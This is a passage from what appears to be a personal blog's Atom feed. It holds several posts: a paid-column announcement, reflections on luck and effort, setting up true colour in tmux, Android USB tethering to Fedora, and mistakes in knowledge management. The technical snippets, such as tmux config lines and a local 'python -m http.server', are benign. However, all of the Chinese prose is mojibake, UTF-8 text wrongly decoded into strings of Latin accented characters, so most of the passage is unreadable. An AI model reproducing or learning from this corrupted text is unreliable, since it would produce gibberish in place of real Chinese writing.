çš„æ„æ€ã€‚</p><p>åœ¨äººçš„ä¸€ç”Ÿä¸­ï¼Œéœ€è¦ä¸æ–­åœ°é”¤ç‚¼è‡ªå·±çš„æ€ç»´ï¼Œç”¨ç°åœ¨æµè¡Œçš„è¯è®²ï¼Œå«ã€Œè®¤çŸ¥å‡çº§ã€ã€‚</p><p>å¼€ä¸“æ æ˜¯ä¸ºäº†æ›´åŠ æ·±åº¦çš„åˆ†äº«ï¼Œå’Œå…¬å¼€åˆ†äº«ä¸åŒï¼Œæˆ‘å¸Œæœ›å¯ä»¥æ›´åŠ è‡ªç”±åœ°è¡¨è¾¾è‡ªå·±çš„æ‰€æ€æ‰€æƒ³ã€‚</p><h2 id="æˆ‘ä¼šå†™äº›ä»€ä¹ˆï¼Ÿ"><a href="#æˆ‘ä¼šå†™äº›ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æˆ‘ä¼šå†™äº›ä»€ä¹ˆï¼Ÿ"></a>æˆ‘ä¼šå†™äº›ä»€ä¹ˆï¼Ÿ</h2><p>è¿™ä¸ä¸€ä¸ªå‚ç›´åˆ†ç±»çš„ä¸“æ ï¼Œæˆ‘å¾ˆæ¬£èµä¸€å¥è¯ã€Œäººç”Ÿå¾ˆç²¾å½©ï¼Œå†…å®¹ä¸å‚ç›´ã€ï¼Œå†™ä»€ä¹ˆå†…å®¹ä¸»è¦æ˜¯æ ¹æ®æˆ‘çš„å…´è¶£ï¼Œçœ‹ä»€ä¹ˆæ–‡ç« è¯»ä»€ä¹ˆä¹¦ä¹Ÿæ˜¯æ ¹æ®æˆ‘è‡ªå·±çš„å“ä½å†³å®šã€‚</p><p>å¤§ä½“ä¸Šä¼šå†™ é‡‘èæŠ•èµ„ï¼ŒçŸ¥è¯†ç®¡ç†ï¼Œäº§å“å¼€å‘ï¼Œç”Ÿäº§æ•ˆç‡ï¼Œå’Œä¸ªäººæˆé•¿è¿™å‡ ä¸ªä¸»é¢˜ï¼Œè®¡ç®—æœºç§‘å­¦ï¼Œç½‘ç»œå®‰å…¨ä¼°è®¡ä¹Ÿä¼šå†™ä¸€äº›ã€‚</p><p>ä¸“æ é‡Œæ¯ç¯‡çš„ç¯‡å¹…ä¸ä¼šå¾ˆé•¿ï¼Œå°½é‡ä¿æŒåœ¨ä¸¤ã€ä¸‰ç™¾å­—ä»¥å†…ç²¾ç‚¼å†…å®¹ã€‚å’Œå…¬å¼€åˆ†äº«ä¸åŒï¼Œå…¬å¼€åˆ†äº«æˆ‘å°½é‡åšåˆ°ç†æ€§å®¢è§‚ï¼Œä¸“æ é‡Œçš„å†…å®¹ä¸ªäººè‰²å½©ä¼šæµ“é‡ä¸€äº›ã€‚å½“ä¸“æ é‡Œç›¸å…³çš„å†…å®¹è¶³å¤Ÿä¸°å¯Œåï¼Œä¼šæ•´ç†æˆä¸€ç¯‡åšå®¢æ–‡ç« ï¼Œä½†æ•´ä½“æ€è€ƒçš„è¿‡ç¨‹åªåœ¨ä¸“æ é‡Œä¿ç•™ã€‚</p><p>æ›´æ–°é¢‘ç‡ï¼šä¸»è¦å–å†³ä¸ä¸ªäººçš„çŠ¶æ€ï¼ŒçŠ¶æ€å¥½å°±å¤šå‘ï¼Œä»¥ä¿è¯è´¨é‡ä¸ºå‰æï¼Œå°½åŠ›ä¿è¯æ¯å‘¨ &gt;&#x3D; 5 ç¯‡ã€‚</p><h2 id="æ‚¨èƒ½å¾—åˆ°ä»€ä¹ˆ"><a href="#æ‚¨èƒ½å¾—åˆ°ä»€ä¹ˆ" class="headerlink" title="æ‚¨èƒ½å¾—åˆ°ä»€ä¹ˆ?"></a>æ‚¨èƒ½å¾—åˆ°ä»€ä¹ˆ?</h2><ol><li><p>æ”¹å˜ä¸‰è§‚çš„ç¡¬çŸ¥è¯†ï¼Œé€šç”¨çš„è½¯æŠ€èƒ½</p></li><li><p>è¯»ä¹¦å’Œå­¦ä¹ æ–¹æ³•çš„åˆ†äº«</p></li><li><p>æ¯æ—¥é˜…è¯»å’Œæ€è€ƒçš„æ ¸å¿ƒå†…å®¹ï¼Œç²¾ä¸­å–ç²¾</p></li></ol><h2 id="ä¸è¦æœŸå¾…ä»€ä¹ˆï¼Ÿ"><a href="#ä¸è¦æœŸå¾…ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸è¦æœŸå¾…ä»€ä¹ˆï¼Ÿ"></a>ä¸è¦æœŸå¾…ä»€ä¹ˆï¼Ÿ</h2><p>ä¸€ã€æ²¡æœ‰ç¤¾ç¾¤ï¼Œæ²¡æœ‰åœˆå­ï¼Œæ²¡æœ‰è¿æ¥ã€‚ä½ ä¸ä¼šå› ä¸ºè®¢é˜…è¿™ä¸ªä¸“æ è€Œè·å¾—äººè„‰ã€‚ï¼ˆå¼€æ”¾ç•™è¨€ï¼Œå’Œä½œè€…äº¤æµæ˜¯å¯ä»¥çš„ï¼‰</p><p>äºŒã€åªæ˜¯è¾ƒä¸ºé›¶ç¢çš„è§‚å¯Ÿå’Œè®°å½•ï¼Œä¸ä¼šæ˜¯æˆä½“ç³»çš„å¤§è§„æ¨¡è¾“å‡ºã€‚ä½ ä¸ä¼šç«‹åˆ»è·å¾—å¯è½åœ°æ‰§è¡Œçš„æ–¹æ³•è®ºã€‚</p><p>ä¸‰ã€è¿™æ˜¯ä¸€ä¸ªå®Œå…¨å…´è¶£å¯¼å‘çš„ä¸“æ ï¼Œè¾“å‡ºå†…å®¹å®Œå…¨å–å†³äºæˆ‘çš„å…´è¶£æ‰€åœ¨ã€‚</p><h2 id="å¦‚ä½•è®¢é˜…ï¼Ÿ"><a href="#å¦‚ä½•è®¢é˜…ï¼Ÿ" class="headerlink" title="å¦‚ä½•è®¢é˜…ï¼Ÿ"></a>å¦‚ä½•è®¢é˜…ï¼Ÿ</h2><p>æ‰«ç æ‰“å¼€ä¸“æ ï¼Œç‚¹å‡»é¡µé¢åº•éƒ¨çš„è®¢é˜…ã€‚</p><img src="https://www.usmacd.com/img/MindForge.jpeg" width="400"/><p><a href="https://xiaobot.net/p/MindForge">https://xiaobot.net/p/MindForge</a> </p><p>è®¢é˜…åï¼Œè®°å¾—å…³æ³¨å…¬ä¼—å·ï¼Œå†…å®¹æ›´æ–°ä¼šæœ‰æé†’ã€‚é»˜è®¤æ¯å‘¨äº”æ±‡æ€»æŠ•é€’ä¸€æ¬¡ï¼Œä¹Ÿå¯æ”¹ä¸ºæ¯æ—¥æ±‡æ€»æŠ•é€’ã€‚</p><p>ã€Œå°æŠ¥ç«¥æŠ•é€’ã€å¾®ä¿¡å…¬ä¼—å·ï¼Œå¯ä»¥è®¾ç½®å¼€å¯ã€Œé‚®ç®±æŠ•é€’ã€ï¼Œå¼€å¯åå°æŠ¥ç«¥ä¼šç»™ä½ å‘é€æ›´æ–°çš„ä¸“æ å†…å®¹ã€‚ åˆ©ç”¨é‚®ç®±æä¾›çš„æœç´¢åŠŸèƒ½ï¼Œåœ¨é‚®ä»¶ä¸­æœç´¢ä¸“æ åå­—ï¼Œå³å¯éšæ—¶æŸ¥é˜…ã€‚</p><p>è·¯å¾„ï¼šå°æŠ¥ç«¥æŠ•é€’ -&gt; å¼€å§‹é˜…è¯» -&gt; æŠ•é€’è®¾ç½®</p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¯»ã€Šè¿æ°”ä¸åŠªåŠ›ã€‹æœ‰æ„Ÿ</title>
    <link href="/cn/luck_and_success/"/>
    <url>/cn/luck_and_success/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘æ„Ÿè§‰ã€Šè¿æ°”ä¸åŠªåŠ›ã€‹è¿™ç¯‡åšå®¢æ˜¯ 2024 å¹´çœ‹è¿‡çš„æœ€å¥½çš„å‡ ç¯‡ä¹‹ä¸€ï¼Œåœ¨ç»ˆç”Ÿå­¦ä¹ ï¼ŒæˆåŠŸä¸è¿æ°”ç­‰å¤šæ–¹é¢äº§ç”Ÿäº†å…±é¸£ï¼Œæˆ‘ä»¬é¢å¯¹çš„æ˜¯ä¸€ä¸ªå¤æ‚çš„ä¸–ç•Œï¼Œèƒ½å¤ŸæŠŠæ¡çš„ä¸œè¥¿åªæ˜¯æå°‘æ•°ã€‚</p><h2 id="å…³äºæˆåŠŸçš„è¦ç´ "><a href="#å…³äºæˆåŠŸçš„è¦ç´ " class="headerlink" title="å…³äºæˆåŠŸçš„è¦ç´ "></a>å…³äºæˆåŠŸçš„è¦ç´ </h2><p>è¿™äº›å¹´çœ‹äº†å¾ˆå¤šå…³äºæˆåŠŸå­¦æ–¹æ³•è®ºçš„æ–‡ç« ï¼Œç­”æ¡ˆæ˜¯æ²¡æœ‰é“¶å¼¹ (No silver bullet) ï¼Œæ²¡æœ‰ä»€ä¹ˆç§˜æŠ€å¯ä»¥ä¸€æ­¥ç™»å¤©ã€‚</p><p>å•ä¼Ÿå»ºåœ¨æ¯æ ¡æ—§é‡‘å±±å¤§å­¦çš„ä¸€æ¬¡æ¼”è®²ä¸­è¯´ï¼Œåœ¨ä»»ä½•é¢†åŸŸå–å¾—æˆåŠŸï¼Œæœ€é‡è¦çš„æ˜¯ä¸‰æ–¹é¢ï¼š</p><ol><li>åšæŒç»ˆç”Ÿå­¦ä¹  (keep learning)</li><li>å¥½çš„åˆ¤æ–­åŠ›ï¼ˆgood judgementï¼‰</li><li>è¿æ°” (good luck)</li></ol><p>è¿™å’Œæˆ‘å‰æ®µæ—¶é—´å‘çš„ã€Œå·¥ç¨‹å¸ˆæŠŠäº‹æƒ…åšå¥½çš„ä¸‰æ¡è¾¹ã€ä¸­çš„è¯´æ³•æœ‰å…³è”ï¼Œå·¥ç¨‹å¸ˆè¦æŠŠäº‹æƒ…åšå¥½å¿…é¡»ä»æœ€ä¸‹é¢çš„åŸºçº¿ï¼Œæ²¿ç€ç»³ç´¢å‘ä¸Šçˆ¬ã€‚</p><div class="note note-info">            <ul><li>æœ€ä¸‹é¢ä¸€æ¡çº¿æ˜¯åŸºçº¿ï¼Œå¯ä»¥ç†è§£ä¸ºäººç±»æ‰€æŒæ¡çš„å·¥ç¨‹çŸ¥è¯†</li><li>æœ€ä¸Šé¢ä¸€æ¡çº¿æ˜¯æé™ï¼Œæé™æ˜¯ç†è®ºç»™å‡ºçš„ï¼Œæé™æ— æ³•çªç ´</li><li>ä¸­é—´é‚£æ¡çº¿æ˜¯ä»åŸºçº¿å‘æé™å‘ä¸Šæ”€ç™»çš„ç»³ç´¢ã€‚</li></ul>          </div><p>è™½ç„¶æ–‡ä¸­è¯´çš„æ˜¯å·¥ç¨‹å¸ˆï¼Œç”Ÿæ´»ä¸­çš„å¾ˆå¤šäº‹ä¹Ÿæ˜¯é€‚ç”¨çš„ã€‚ç»ˆç”Ÿå­¦ä¹ æ˜¯ä¸ºäº†æé«˜è‡ªå·±çš„åŸºçº¿ï¼Œä»¥å¢åŠ è‡ªå·±æ­£ç¡®åˆ¤æ–­æ–¹å‘çš„æ¦‚ç‡ï¼Œè‡³äºç¼–åˆ¶çš„ç»³ç´¢èƒ½çˆ¬å¤šé«˜ï¼ŒçœŸè¦é ç‚¹è¿æ°”ã€‚</p><p>è¿æ°”å¾ˆéš¾ä»¥æ‰æ‘¸ï¼Œåˆ°åº•æ˜¯æ—¶åŠ¿é€ è‹±é›„ï¼Œè¿˜æ˜¯è‹±é›„é€ æ—¶åŠ¿ï¼Œä¹ŸæŒºéš¾è¯´æ¸…æ¥š ï¼Ÿæ‰¿è®¤è¿æ°”è®©äººæ›´åŠ è°¦è™šï¼Œå¤§å¤šæˆåŠŸéƒ½æ˜¯ä¸ªäººç¢°è¿æ°”åŠ åŠªåŠ›å¥‹æ–—çš„ç»“æœã€‚ä½†æ˜¯æœºä¼šæ€»æ˜¯å‚é’æœ‰å‡†å¤‡çš„äººï¼Œå½“è¿æ°”æ¥çš„æ—¶å€™ï¼Œå°±çœ‹èƒ½ä¸èƒ½æŠ“ä½äº†ã€‚</p><p><strong>æ•…äº‹</strong></p><p>OpenAI æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œé€‰å¯¹äº†æ–¹å‘å¤§æ¨¡å‹ï¼Œä» GPT-1 å¼€å§‹ï¼ŒGPT-2, GPT-3, ä¸€ç›´åˆ° GPT-3.5 ä¸€é¸£æƒŠäººï¼Œç”¨ä¸€å¥è¯æ€»ç»“ï¼šOpenAI åšå¯¹é€‰æ‹©å¹¶åšæŒäº†ä¸‹å»ï¼ŒæœŸé—´æ‰¾åˆ°â€œè´µäººâ€å¾®è½¯ç›¸åŠ©å®ˆä½äº†è¿™ä»½å°‘å¹´æ„æ°” ï¼š)</p><h2 id="å…³äºæ¯…åŠ›-grit"><a href="#å…³äºæ¯…åŠ›-grit" class="headerlink" title="å…³äºæ¯…åŠ› (grit)"></a>å…³äºæ¯…åŠ› (grit)</h2><p>æ–‡ä¸­è¿˜æåŠä¸€ç‚¹ï¼Œ Angela Duckworth å¼ºè°ƒçš„æ¯…åŠ›ï¼ˆgritï¼‰åœ¨æˆåŠŸä¸­æ‰€èµ·çš„ä½œç”¨ã€‚grit ä¸€è¯ä¸­æ–‡ç¿»è¯‘å«ä¹‰ä¸°å¯Œï¼Œæœ‰ã€Œå‹‡æ°”ã€åšæ¯…ã€åšå®šã€çš„æ„æ€ï¼Œæˆ‘ä¸€èˆ¬ç”¨è¯ â€œåšæŒä¸æ‡ˆâ€ï¼ŒåšæŒå¾ˆé‡è¦ã€‚åšæŒä¸æ‡ˆçš„åŠ›é‡å¾ˆå®¹æ˜“è¢«å¿½ç•¥ï¼Œå°±åƒäººä»¬æ€»æ˜¯å¼ºè°ƒã€Œåˆ»æ„ç»ƒä¹ ã€è€Œä¸æ€ä¹ˆæã€Œä¸€ä¸‡å°æ—¶å®šå¾‹ã€ä¸€æ ·ã€‚</p><p>æ—¶é—´æ˜¯æœ€å…¬å¹³çš„ï¼Œæ¯ä¸ªäººä¸€å¤©éƒ½åªæœ‰ 24 å°æ—¶ï¼Œä½ æŠŠæ—¶é—´èŠ±åœ¨å“ªé‡Œï¼Œå“ªé‡Œå°±ä¼šæœ‰è¿›æ­¥ï¼Œè™½ç„¶è¿›æ­¥å¯å¤§å¯å°ï¼Œä½†å‡ ä¹æ€»æ˜¯æ¯”ä¸èŠ±æ—¶é—´è¦å¥½ã€‚</p><p><strong>æ•…äº‹</strong></p><p>å¾—åˆ°è¯¾ç¨‹ã€Šé¦™å¸…çš„åŒ—å¤§é‡‘èå­¦è¯¾ã€‹æ˜¯ä¸€é—¨çƒ­é—¨è¯¾ç¨‹ï¼Œå‚åŠ å­¦ä¹ çš„äººå¾ˆå¤šå¤§æ¦‚æœ‰ 36 ä¸‡ã€‚</p><p>ä»ã€Œ01 é‡‘èä¸–ç•Œè§‚ã€å¼€å§‹ï¼Œæ¯èŠ‚è¯¾ç¨‹å¹³å‡æœ‰ 30 å¤šä¸‡äººå­¦ä¹ ï¼Œåˆ°æœ€åçš„ã€Œ09 é‡‘èæ€ç»´æ–¹æ³•è®ºã€ï¼Œæ¯èŠ‚è¯¾å¹³å‡ä¼šæœ‰å¤šå°‘äººå­¦ä¹  ï¼Ÿ ç­”æ¡ˆæ˜¯ 10 ä¸‡äººå·¦å³ï¼Œå·®ä¸å¤šæœ‰ 2&#x2F;3 çš„äººæ²¡æœ‰å­¦å®Œï¼ˆä¿å®ˆä¼°ç®—ï¼Œé¦™å¸…è€å¸ˆçš„è¿™é—¨è¯¾ç¨‹æ˜¯ 2017 å¹´ 12 æœˆå¼€è¯¾ï¼Œåˆ°ç°åœ¨å·²ç»6 å¹´å¤šäº†ï¼‰ã€‚</p><h2 id="å…³äºä»˜è´¹ç¾¤"><a href="#å…³äºä»˜è´¹ç¾¤" class="headerlink" title="å…³äºä»˜è´¹ç¾¤"></a>å…³äºä»˜è´¹ç¾¤</h2><p>å…³äºä»˜è´¹ç¾¤å€¼ä¸å€¼å¾—åŠ å…¥çš„é—®é¢˜ï¼Œæˆ‘æœ‰äº›ä¸åŒçš„çœ‹æ³•ï¼Œæˆ‘è®¤ä¸ºç»å¤§å¤šæ•°ä»˜è´¹ç¾¤ä¸å€¼å¾—åŠ å…¥ã€‚</p><p>æœ‰çš„ç¾¤å–çš„æ˜¯çœŸçš„ã€Œä¿¡æ¯å·®ã€ï¼Œè¿™äº›èµ„æ–™åœ¨äº’è”ç½‘ä¸Šæ˜¯å…¬å¼€çš„ï¼Œå¯ä»¥å…è´¹è·å–ï¼Œå³ä½¿è·å¾—äº†ä¹Ÿç”¨å¤„ä¸å¤§ã€‚</p><p>ä¸€äº›è¡Œä¸šå†…çš„å¤§å’–ï¼Œäº’è”ç½‘çŸ¥åäººå£«çš„è¯¾ç¨‹ï¼Œè¿˜æ˜¯æœ‰ä¸€äº›æ„ä¹‰çš„ï¼Œæœ‰äº›ä¸šå†…äººå£«è®¤ä¸ºçš„ã€Œå¸¸è¯†ã€ï¼Œå¯¹æ™®é€šäººä¹Ÿæ˜¯æœ‰å¸®åŠ©çš„ï¼Œä½†è¿˜æ˜¯éœ€è¦å¾ˆå¼ºçš„é‰´åˆ«èƒ½åŠ›ï¼Œå€˜è‹¥ä»·æ ¼ä¸è²çœŸè¦è€ƒè™‘å€¼ä¸å€¼å¾—ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol><li><p>è¿æ°”ä¸åŠªåŠ› - æ±Ÿå®,  May 31, 2024<br><a href="https://1byte.io/articles/luck/">https://1byte.io/articles/luck/</a></p></li><li><p>å°¤é›¨æºªè°ˆæˆåŠŸå’Œè¿æ°”<br><a href="https://www.usmacd.com/cn/youyuxi/">https://www.usmacd.com/cn/youyuxi/</a></p></li><li><p>å…¬å¼€å†™ä½œçš„å¥½å¤„å’ŒåšæŒä¸æ‡ˆ<br><a href="https://www.usmacd.com/cn/public_writing/">https://www.usmacd.com/cn/public_writing/</a></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸º tmux è®¾ç½®çœŸå½©è‰²</title>
    <link href="/cn/tmux_truecolor/"/>
    <url>/cn/tmux_truecolor/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨ tmux ä¸­ä½¿ç”¨ vim onedark themeï¼Œæ€»æ˜¯è§‰å¾—æ€ªæ€ªçš„ï¼Œé»‘è‰²æ˜¾ç¤ºåç°ã€‚æ— æ„ä¸­å‘ç° <code>joshdick/onedark.vim</code> ä¸­æåˆ°éœ€è¦ä¸º tmux è®¾ç½®çœŸå½©è‰²ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">- Plain ASCII<br>- ANSI escape codes: 16 color codes with bold/italic and background<br>- 256 color palette: 216 colors + 16 ANSI + 24 gray (colors are 24-bit)<br>- 24-bit truecolor: &quot;888&quot; colors (aka 16 million)<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ç»ˆç«¯æ˜¯å¦æ”¯æŒçœŸå½©è‰²ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬ <a href="https://raw.githubusercontent.com/gnachman/iTerm2/master/tests/24-bit-color.sh">24-bit-color.sh</a></p><p><code>bash ./24-bit-color.sh</code> å¦‚æœç»ˆç«¯é¢œè‰²æ˜¯è¿è´¯çš„åˆ™æ”¯æŒäº†çœŸå½©è‰²ï¼Œå¦‚æœé¢œè‰²æ˜¯åˆ†å—çš„åˆ™æ²¡æœ‰æ”¯æŒã€‚</p><p>ä¿®æ”¹ ~&#x2F;.tmux.conf åŠ ä¸Šä¸¤è¡Œ</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">set -g default-terminal &quot;tmux-256color&quot;<br>set-option -ga terminal-overrides &quot;,$&#123;TERM&#125;:Tc&quot;<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">default-terminal terminal<br>        Set the default terminal for new windows created in this session - the default value of the TERM environment variable.  For tmux to work correctly, this must be  set  to<br>        â€˜screenâ€™, â€˜tmuxâ€™ or a derivative of them.<br><br><br>terminal-overrides[] string<br>        Allow  terminal  descriptions  read  using  terminfo(5)  to  be  overridden.   Each  entry  is a colon-separated string made up of a terminal type pattern (matched using<br>        fnmatch(3)) and a set of name=value entries.<br><br>        For example, to set the â€˜clearâ€™ terminfo(5) entry to â€˜\e[H\e[2Jâ€™ for all terminal types matching â€˜rxvt*â€™:<br><br>                rxvt*:clear=\e[H\e[2J<br><br>        The terminal entry value is passed through strunvis(3) before interpretation.<br></code></pre></td></tr></table></figure><p>è¦è®© tmux é‡æ–°åŠ è½½ <code>~/.tmux.conf</code> éœ€è¦é€€å‡ºæ‰€æœ‰çš„ tmux è¿›ç¨‹åï¼Œé‡æ–°æ‰§è¡Œ tmux ã€‚æœ€åï¼Œæ£€æŸ¥ä½ çš„ tmux æ˜¯å¦å¼€å¯äº†çœŸå½©è‰²ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">tmux info | grep Tc<br> 227: Tc: (flag) true<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>Adding 24-bit TrueColor RGB escape sequences to tmux - Suraj N. Kurapati , 29 January 2016<br><a href="https://sunaku.github.io/tmux-24bit-color.html#usage">https://sunaku.github.io/tmux-24bit-color.html#usage</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android ç³»ç»Ÿçš„ USB Tethering åŠŸèƒ½</title>
    <link href="/cn/android_usb_tethering/"/>
    <url>/cn/android_usb_tethering/</url>
    
    <content type="html"><![CDATA[<p>Android ç³»ç»Ÿçš„ USB Tethering å¯ä»¥å…±äº« Android æ‰‹æœºçš„ Internet è¿æ¥ï¼Œä½¿ç”¨è¿™ä¸ªåŠŸèƒ½åï¼Œå¦‚æœ Android èƒ½å¤Ÿé€šè¿‡ Wi-Fiä¸Šç½‘æˆ–è€…ç§»åŠ¨æ•°æ®ç½‘ç»œä¸Šç½‘ï¼Œåˆ™ä½ çš„ç”µè„‘ä¹Ÿèƒ½å¤Ÿé€šè¿‡USBæ•°æ®çº¿å…±äº«ç½‘ç»œä¸Šç½‘äº†ã€‚</p><p>Android æ‰‹æœºçš„è®¾ç½®æ–¹æ³•ï¼šSettings &#x3D;&gt; Network &amp; internet &#x3D;&gt; Hotspot &amp; tethering &#x3D;&gt; USB tethering</p><p>ä¸åŒå‚å•†çš„ç³»ç»Ÿåå­—å¯èƒ½ä¸åŒï¼ŒColorOS ä¸Šå« ã€ŒUSB ç½‘ç»œå…±äº«ã€ã€‚</p><p>ç”¨ USB æ•°æ®çº¿è¿æ¥ Android æ‰‹æœºå’Œ PC åï¼Œåœ¨ Android ç³»ç»Ÿä¸­å¼€å¯ USB ç½‘ç»œå…±äº«ï¼Œæˆ‘çš„Fedora linux å¯ä»¥åˆ©ç”¨ Android çš„ç½‘ç»œä¸Šç½‘äº†ï¼ˆWindows ç³»ç»Ÿåº”è¯¥ä¹Ÿå¯ä»¥ï¼‰ã€‚Fedora linux è‡ªåŠ¨æ·»åŠ äº†ä¸€ä¸ªç½‘ç»œè¿æ¥ï¼Œ linux  PC å’Œ Android æ‰‹æœºå¤„äºåŒä¸€å±€åŸŸç½‘ä¸‹ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx">        <span class="hljs-attribute">IPv4</span> åœ°å€ï¼š<span class="hljs-number">192.168.203.204</span><br>    IPv4 é»˜è®¤ç½‘å…³ï¼š<span class="hljs-number">192.168.203.74</span><br>IPv4 ä¸»åŸŸåæœåŠ¡å™¨ï¼š<span class="hljs-number">192.168.203.74</span><br></code></pre></td></tr></table></figure><p>Androd æ‰‹æœºå¯ä»¥é€šè¿‡ 192.168.203.204 è®¿é—® PC ã€‚linux å’Œ Android åœ¨åŒä¸€å±€åŸŸç½‘ä¸‹ï¼Œæ–‡ä»¶ä¼ è¾“å°±å¾ˆå¤šåŠæ³•äº†ã€‚æœ‰æ¨æ²¹æç¤ºï¼Œ åœ¨ PC ç«¯æ‰§è¡Œ python -m http.server æ‰‹æœºç«¯å¯ä»¥ç”¨æµè§ˆå™¨è®¿é—®ä¸‹è½½ PC ä¸Šçš„æ–‡ä»¶ã€‚</p><p>æ³¨ï¼šWindows ç³»ç»Ÿå’Œ Fedora Linux ä¸åŒçš„æ˜¯ç³»ç»Ÿä¼šå¼¹å‡ºä¸€ä¸ªæç¤ºï¼Œç‚¹å‡»ç¡®è®¤åæ‰ä¼šå’Œ Android æ‰‹æœºå»ºç«‹ç½‘ç»œè¿æ¥ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>Share a mobile connection by hotspot or tethering on Android<br><a href="https://support.google.com/android/answer/9059108?hl=en">https://support.google.com/android/answer/9059108?hl=en</a></p><p>What is USB Tethering and How to Enable it?    12 Mar, 2021<br><a href="https://www.geeksforgeeks.org/what-is-usb-tethering-and-how-to-enable-it/">https://www.geeksforgeeks.org/what-is-usb-tethering-and-how-to-enable-it/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çŸ¥è¯†ç®¡ç†çš„å‡ ä¸ªè¯¯åŒº</title>
    <link href="/cn/PKM_faults/"/>
    <url>/cn/PKM_faults/</url>
    
    <content type="html"><![CDATA[<p>æŸ¥ç†Â·èŠ’æ ¼æ›¾å¤šæ¬¡åœ¨é‡‡è®¿ä¸­æåˆ°ï¼Œè‡ªå·±ä¸€è¾ˆå­åªç ”ç©¶ä¸¤ä»¶äº‹æƒ…ï¼šç¬¬ä¸€ç§æ˜¯å‘ç°ä»€ä¹ˆæœ‰æ•ˆï¼Œç„¶åå®è·µå®ƒï¼›ç¬¬äºŒç§æ˜¯å‘ç°ä»€ä¹ˆæ˜¯æ— æ•ˆçš„ï¼Œç„¶åè§„é¿å®ƒã€‚æŸ¥ç†Â·èŠ’æ ¼ä¼šèŠ±è´¹å¤§é‡æ—¶é—´æ¥ç ”ç©¶ä»€ä¹ˆäº‹ä¼šå¤±è´¥ï¼Œå°½å¯èƒ½å‡å°‘è®¤çŸ¥åå·®ã€‚</p><p>æˆ‘åœ¨çŸ¥è¯†ç®¡ç†æ–¹é¢çŠ¯è¿‡ä¸å°‘é”™è¯¯ï¼Œå‘èŠ’æ ¼å­¦ä¹ æ€»ç»“çŸ¥è¯†ç®¡ç†çš„å‡ ä¸ªé”™è¯¯ã€‚</p><h2 id="å®Œç¾å·¥å…·é™·é˜±-the-perfect-tool-trap"><a href="#å®Œç¾å·¥å…·é™·é˜±-the-perfect-tool-trap" class="headerlink" title="å®Œç¾å·¥å…·é™·é˜± (the perfect tool trap)"></a>å®Œç¾å·¥å…·é™·é˜± (the perfect tool trap)</h2><h3 id="é¢‘ç¹åˆ‡æ¢çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ"><a href="#é¢‘ç¹åˆ‡æ¢çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="é¢‘ç¹åˆ‡æ¢çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ"></a>é¢‘ç¹åˆ‡æ¢çŸ¥è¯†ç®¡ç†ç³»ç»Ÿ</h3><p>æˆ‘ä½¿ç”¨è¿‡ EverNoteï¼ŒWizNoteï¼ŒVNote å†™ç¬”è®°ï¼Œä¹Ÿä½¿ç”¨è¿‡ CSDN blogï¼ŒGoogle blogspot, WordPress å†™åšå®¢ï¼Œç–²äºå°è¯•å„ç§ç³»ç»Ÿï¼Œæœ€ç»ˆåªé€ æˆçŸ¥è¯†ã€æ–‡ç« æ•£è½åœ¨å¤šä¸ªäº’è”ç½‘è§’è½ã€‚æˆ‘ä¹Ÿå°è¯•è¿‡ä½¿ç”¨ txt, orgmode, markdownï¼Œå¯Œæ–‡æœ¬ç­‰å¤šç§æ ¼å¼ï¼Œæœ€ç»ˆåªé€ æˆå„ç§æ ¼å¼è½¬æ¢çƒ¦æ¼ã€‚</p><p>ç°å®ä¸­å¹¶ä¸å­˜åœ¨ä¸€ä¸ª All in One çš„å®Œç¾å·¥å…·ï¼Œæ¯ä¸ªå·¥å…·éƒ½æœ‰å…¶é•¿å¤„å’ŒçŸ­å¤„ï¼Œæ¥å—å·¥å…·çš„ä¸å®Œç¾ï¼Œå“ªä¸ªå·¥å…·åˆé€‚å°±ç”¨å“ªä¸ªå·¥å…·ã€‚</p><p>æ–°çš„å·¥å…·å±‚å‡ºä¸ç©·ï¼Œä¸æ–­å¸å¼•ä½ 